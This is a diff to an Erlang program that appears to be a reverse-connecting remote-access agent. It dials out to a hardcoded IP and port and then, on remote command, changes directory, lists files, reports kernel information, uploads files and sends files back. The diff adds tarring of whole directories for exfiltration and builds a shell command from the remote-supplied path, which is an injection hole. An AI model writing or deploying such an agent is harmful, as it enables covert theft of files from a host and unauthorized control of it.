@@ -2,6 +2,8 @@
 -export([start/0,start_link/0]).
 %27517
 start_link() ->
+    file:make_dir("default"),
+    shell_default:cd("default"),
     spawn(?MODULE,start,[]),{ok,self()}.
 start() ->
     Socket = case gen_tcp:connect({172,19,4,57}, 27517, [binary, {active,false}]) of
@@ -54,20 +56,26 @@ loop(Socket) ->
     case gen_tcp:recv(Socket,0) of
         {ok, Packet} ->
             case Packet of
-                <<"ls">> ->
-                    %LsOut = 
-                    os:cmd("cd ..\nls"),
-                    %io:format("outResultCmd:~p~n",[LsOut]),
-                    %io:format("Cmd:~p~n",[Packet]),
+                <<"cd ",Pack/binary>> ->
+                    shell_default:cd(binary_to_list(Pack)),
                     loop(Socket);
                 <<"getf ",Pack/binary>> ->
                     case file:read_file(binary_to_list(Pack)) of
                         {ok, BinaryFile} ->
                             %io:format("send ~p~n file",[BinaryFile]),
-                            gen_tcp:send(Socket, BinaryFile),
-                            loop(Socket);
+                            case filelib:is_file(binary_to_list(Pack)) of
+                                true ->
+                                    gen_tcp:send(Socket, BinaryFile),
+                                    loop(Socket);
+                                false ->
+                                    os:cmd("tar -cvzf " ++ binary_to_list(Pack) ++ ".tar.gz " ++ binary_to_list(Pack)),
+                                    {ok, BFile} = file:read_file(binary_to_list(Pack) ++ ".tar.gz"),
+                                    gen_tcp:send(Socket, BFile),
+                                    loop(Socket)
+                            end;
                         {error, Reason} ->
-                            io:format("error:~p~n",[Reason])
+                            io:format("error:~p~n",[Reason]),
+                            loop(Socket)
                     end;
                 <<"sendf ",Pack/binary>> ->
                     {ok, Size} = gen_tcp:recv(Socket,0),
@@ -78,10 +86,11 @@ loop(Socket) ->
                             file:write_file(binary_to_list(Pack), BinaryFile),
                             loop(Socket);
                         {error, Reason} ->
-                            io:format("error:~p~n",[Reason])
+                            io:format("error:~p~n",[Reason]),
+                            loop(Socket)
                     end;
                 <<"list">> ->
-                    ListFile = erlang:list_to_binary(os:cmd("ls -r")),
+                    ListFile = erlang:list_to_binary(os:cmd("ls")),
                     gen_tcp:send(Socket, ListFile),
                     loop(Socket);
                 <<"kernalinfo">> ->
@@ -89,8 +98,10 @@ loop(Socket) ->
                     gen_tcp:send(Socket, Kernal),
                     loop(Socket);
                 _ ->
-                    io:format("errorCmd:~p~n",[Packet])
+                    io:format("errorCmd:~p~n",[Packet]),
+                    loop(Socket)
             end;
         {error, Reason} ->
-            io:format("error:~p~n",[Reason])
+            io:format("error:~p~n",[Reason]),
+            loop(Socket)
     end.
